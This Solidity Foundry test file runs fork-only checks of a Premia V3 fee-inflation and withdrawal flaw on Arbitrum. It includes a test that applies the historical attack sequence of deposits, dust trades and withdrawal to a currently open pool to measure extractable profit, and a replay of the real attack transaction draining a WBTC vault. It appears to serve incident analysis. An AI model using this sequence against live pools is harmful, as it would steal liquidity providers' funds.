// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console2} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC20, IPool, IVault, IVaultRegistry, IPoolFactory} from "../src/IPremia.sol";

/// @notice Read-only fork checks for the Premia V3 (Premia Blue) Arbitrum pool
///         withdrawal / fee-accounting flaw. No mainnet transactions.
contract PremiaTest is Test {
    address constant DIAMOND = 0x2eA42642D1B951f18eA7FbCE495Bea9E517b198F;
    address constant ROUTER = 0xDEfBBAc44F2088a70b648E1231b2cA9683774c48;
    address constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address constant USDCe = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;

    address constant POOL_OPEN = 0x9041E06790A1D705aa81d36D2BF0e664424b4668; // largest open pool at the sweep block
    address constant OP = 0xaC800FD6159c2a2CB8fC31EF74621eB430287a5A;
    address constant POOL_HIST = 0x1B25F69Cfc2b3A9fCC0A7C0944A81723d5dcD77d; // historical attack pool
    address constant EXPIRED_1 = 0xdCD2950EEC35c7B2f802AA6938462eb460727bf6; // 5,138 USDC.e, 2024-03-29
    address constant EXPIRED_2 = 0x201E2CA8a7C7A6F09f20D80edbc9f9F6cAec6614; // 5,127 USDC.e, 2024-03-22
    address constant EXPIRED_3 = 0xa56346B78DeeA5360e38a058438eFc63Ff85eD06; // 1.8489 WETH, 2023-09-15
    address constant EXPIRED_4 = 0xcdaFf5C0040bE49e755cBbca2d08CA0c6b19931d; // 0.0502 WBTC, 2024-02-02

    address constant ATTACKER_EOA = 0xbeBa8CEfD0D75d747C5AD966Dc17C0Bb60D84dBd;
    address constant ATTACK_CONTRACT = 0x577168C8c6fA937495C3D6961f1d7D734b2d785f;
    address constant VAULT_WBTC_C = 0x45dF5EA836A15B561937Ae8373ab9eE984aea531;

    address constant ALICE = address(0xA11CE);

    bytes4 constant OPTION_EXPIRED = 0x9b395bce; // Pool__OptionExpired()

    function _forkLatest() internal {
        string memory url = vm.envOr("ARB_RPC_URL", string(""));
        if (bytes(url).length == 0) url = "https://arb1.arbitrum.io/rpc";
        vm.createSelectFork(url);
    }

    function _archiveUrl() internal returns (string memory) {
        string memory url = vm.envOr("ARB_RPC_URL", string(""));
        if (bytes(url).length == 0) {
            string memory ak = vm.envOr("ALCHEMY_API_KEY", string(""));
            if (bytes(ak).length > 0) {
                url = string.concat("https://arb-mainnet.g.alchemy.com/v2/", ak);
            }
        }
        return url;
    }

    function _dummyKey() internal pure returns (IPool.PositionKey memory) {
        return IPool.PositionKey({owner: ALICE, operator: ALICE, lower: 1e15, upper: 2e15, orderType: 2});
    }

    /// @notice The expiry gate is the first statement of _withdraw: every pool
    ///         holding the large balances reverts Pool__OptionExpired even for a
    ///         caller with a syntactically valid position key.
    function test_expiryGateTopPools() public {
        _forkLatest();
        address[4] memory pools = [EXPIRED_1, EXPIRED_2, EXPIRED_3, EXPIRED_4];
        for (uint256 i; i < pools.length; i++) {
            vm.prank(ALICE);
            vm.expectRevert(abi.encodePacked(OPTION_EXPIRED));
            IPool(pools[i]).withdraw(_dummyKey(), 1, 0, 1e18);
        }
    }

    /// @notice settle() on an expired pool pays the caller's own short collateral
    ///         only; a caller with no position receives (0,false) and no tokens.
    function test_settleExpiredPaysNothing() public {
        _forkLatest();
        uint256 wbtcBefore = IERC20(WBTC).balanceOf(ALICE);
        uint256 usdcBefore = IERC20(USDCe).balanceOf(ALICE);
        vm.prank(ALICE);
        uint256 collateral = IPool(EXPIRED_1).settle();
        assertEq(collateral, 0, "settle collateral");
        assertEq(IERC20(WBTC).balanceOf(ALICE), wbtcBefore, "wbtc moved");
        assertEq(IERC20(USDCe).balanceOf(ALICE), usdcBefore, "usdc moved");
    }

    /// @notice The largest funded non-expired pool is still inside its maturity.
    function test_largestOpenPoolSettings() public {
        _forkLatest();
        (address base, address quote, , uint256 strike, uint256 maturity, bool isCall) = IPool(POOL_OPEN)
            .getPoolSettings();
        assertEq(base, OP, "base");
        assertEq(quote, USDCe, "quote");
        assertEq(strike, 0.12e18, "strike");
        assertTrue(isCall, "call");
        assertGt(maturity, block.timestamp, "not open");
        console2.log("open pool maturity", maturity);
        console2.log("now", block.timestamp);
    }

    /// @notice Deposit a long LP range at nu=1 (price above the range), then withdraw
    ///         without trades. This isolates the deposit/withdraw plumbing.
    function test_currentPool_depositWithdraw() public {
        _forkLatest();
        deal(OP, ALICE, 1000e18);

        vm.startPrank(ALICE);
        IERC20(OP).approve(ROUTER, type(uint256).max);
        (uint256 belowLower, uint256 belowUpper) = IPool(POOL_OPEN).getNearestTicksBelow(1e15, 2e15);
        IPool.PositionKey memory k = _dummyKey();
        uint256 size = 100e18;
        uint256 balBefore = IERC20(OP).balanceOf(ALICE);
        (bool ok, bytes memory ret) = POOL_OPEN.call(
            abi.encodeWithSelector(bytes4(0x631187b9), k, belowLower, belowUpper, size, uint256(0), uint256(1e18))
        );
        console2.log("deposit ok", ok);
        if (!ok) {
            console2.logBytes(ret);
            vm.stopPrank();
            return;
        }
        uint256 afterDeposit = IERC20(OP).balanceOf(ALICE);
        vm.warp(block.timestamp + 120);
        (bool wok, bytes memory wret) = POOL_OPEN.call(
            abi.encodeWithSelector(bytes4(0x61010234), k, size, uint256(0), uint256(1e18))
        );
        console2.log("withdraw ok", wok);
        if (!wok) console2.logBytes(wret);
        vm.stopPrank();

        uint256 balAfter = IERC20(OP).balanceOf(ALICE);
        console2.log("size", size);
        console2.log("collateral paid", balBefore - afterDeposit);
        console2.log("returned", balAfter - afterDeposit);
        // round-trip without trades must not create value out of nothing
        assertLe(balAfter, balBefore, "value created without trades");
    }

    /// @notice Full historical fee-inflation path on the current largest open pool:
    ///         deposit at nu=1, 16 dust AMM round-trips (the exact historical
    ///         trade pattern), then full withdrawal with claimableFees.
    ///         Records the result rather than asserting a fixed profit: the point
    ///         is to measure the live ceiling.
    function test_currentPool_feeInflation() public {
        _forkLatest();
        deal(OP, ALICE, 1000e18);

        uint256 poolBalBefore = IERC20(OP).balanceOf(POOL_OPEN);
        vm.startPrank(ALICE);
        IERC20(OP).approve(ROUTER, type(uint256).max);
        (uint256 belowLower, uint256 belowUpper) = IPool(POOL_OPEN).getNearestTicksBelow(1e15, 2e15);
        IPool.PositionKey memory k = _dummyKey();
        uint256 size = 100e18;
        uint256 balBefore = IERC20(OP).balanceOf(ALICE);

        (bool ok, bytes memory ret) = POOL_OPEN.call(
            abi.encodeWithSelector(
                bytes4(0x631187b9),
                k,
                belowLower,
                belowUpper,
                size,
                uint256(0),
                uint256(1e18)
            )
        );
        console2.log("deposit ok", ok);
        if (!ok) {
            console2.logBytes(ret);
            vm.stopPrank();
            return;
        }

        uint256 tradesOk;
        for (uint256 i; i < 16; i++) {
            bool isBuy = (i % 2) == 1;
            uint256 limit = isBuy ? type(uint256).max : 0;
            (bool tok, ) = POOL_OPEN.call(
                abi.encodeWithSelector(bytes4(0x74386365), uint256(1e14), isBuy, limit, address(0))
            );
            if (tok) tradesOk++;
        }
        console2.log("trades ok", tradesOk);

        vm.warp(block.timestamp + 120);
        (bool wok, bytes memory wret) = POOL_OPEN.call(
            abi.encodeWithSelector(bytes4(0x61010234), k, size, uint256(0), uint256(1e18))
        );
        console2.log("withdraw ok", wok);
        if (!wok) console2.logBytes(wret);
        vm.stopPrank();

        uint256 balAfter = IERC20(OP).balanceOf(ALICE);
        uint256 poolBalAfter = IERC20(OP).balanceOf(POOL_OPEN);
        console2.log("attacker before", balBefore);
        console2.log("attacker after", balAfter);
        console2.log("profit (wei)", balAfter > balBefore ? balAfter - balBefore : 0);
        console2.log("pool before", poolBalBefore);
        console2.log("pool after", poolBalAfter);
        // the pool is the hard cap: profit can never exceed what it held
        assertLe(balAfter, balBefore + poolBalBefore, "profit exceeds pool balance");
    }

    /// @notice Historical replay of the first real attack transaction at the block
    ///         immediately before it. Requires an archive Arbitrum RPC.
    ///         Asserts the WBTC vault loses exactly 3.75 WBTC of its own collateral.
    function test_archiveReplay() public {
        if (!vm.envOr("ARCHIVE_REPLAY", false)) {
            vm.skip(true);
        }
        string memory url = _archiveUrl();
        if (bytes(url).length == 0) {
            vm.skip(true);
        }
        vm.createSelectFork(url, 520_166_478);

        uint256 beforeBal = IERC20(WBTC).balanceOf(VAULT_WBTC_C);
        vm.recordLogs();

        vm.prank(ATTACKER_EOA, ATTACKER_EOA);
        (bool ok, bytes memory ret) = ATTACK_CONTRACT.call(
            abi.encodeWithSelector(bytes4(0xbcea0a12), uint256(0), uint256(3), uint256(0))
        );
        require(ok, "attack replay failed");
        ret;

        uint256 afterBal = IERC20(WBTC).balanceOf(VAULT_WBTC_C);
        console2.log("vault WBTC before", beforeBal);
        console2.log("vault WBTC after", afterBal);
        console2.log("vault WBTC lost", beforeBal - afterBal);
        assertEq(beforeBal - afterBal, 375_000_000, "vault collateral moved");

        // decode ClaimFees for the WBTC pool
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 claimSig = keccak256("ClaimFees(address,uint256,uint256,int256)");
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].emitter == POOL_HIST && logs[i].topics[0] == claimSig) {
                (uint256 fees, ) = abi.decode(logs[i].data, (uint256, int256));
                if (logs[i].topics[1] == bytes32(uint256(uint160(ATTACK_CONTRACT)))) {
                    console2.log("attacker ClaimFees (WBTC wei)", fees);
                    assertEq(fees, 4_490_400_000_000_000_000, "historical fee claim");
                }
            }
        }
    }
}
